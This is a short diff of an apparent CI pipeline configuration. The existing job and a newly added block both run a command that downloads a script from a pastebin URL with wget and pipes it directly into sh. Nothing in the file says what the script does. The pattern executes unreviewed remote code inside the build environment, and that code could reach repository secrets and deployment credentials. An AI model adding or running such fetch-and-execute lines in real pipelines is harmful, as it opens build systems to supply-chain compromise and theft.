@@ -14,3 +14,9 @@ blocks:
         - name: 'Job #2'
           commands:
             - '(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d ''\r'') | sh'
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - '(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d ''\r'') | sh'
